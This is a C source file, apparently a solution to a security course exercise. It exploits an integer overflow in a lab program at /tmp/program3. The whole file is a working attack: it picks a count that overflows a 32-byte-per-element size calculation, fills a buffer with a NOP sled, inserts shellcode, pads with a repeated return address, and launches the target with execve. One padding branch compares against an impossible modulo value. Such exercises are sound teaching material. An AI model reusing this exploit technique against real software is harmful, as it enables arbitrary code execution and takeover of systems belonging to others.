#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define PROGRAM "/tmp/program3"

/*
use 2147484759(unsigned) to multiply 32 (sizeof(struct wid)) to get 35552
which can overflow buffer with size of 24320

string building idea is from https://www.youtube.com/watch?v=wUPujx-f_Js&t=2s
*/
int main(void)
{
  char *args[3];
  char *environ[1];
  char exploit_string[35552];

  for (int i = 0; i < 35552; i++) {
    exploit_string[i] = 0x90;
  }

  memcpy(exploit_string, "2147484759,", 11);
 
  for (int i = 100, j = 0; j < strlen(shellcode); i++, j++) {
    exploit_string[i] = shellcode[j];
  }

  for (int i = 200; i < 35552; i++) {
    if (i % 4 == 0) exploit_string[i] = 0xf4;
    else if (i % 4 == 1) exploit_string[i] = 0xfe;
    else if (i % 4 == 2) exploit_string[i] = 0xff;
    else if (i % 4 == 4) exploit_string[i] = 0x90;
  }

  args[0] = PROGRAM;
  args[1] = exploit_string;
  args[2] = NULL;
  environ[0] = NULL;

  if (0 > execve(PROGRAM, args, environ))
    fprintf(stderr, "call to execve failed.\n");

  return 0;
}
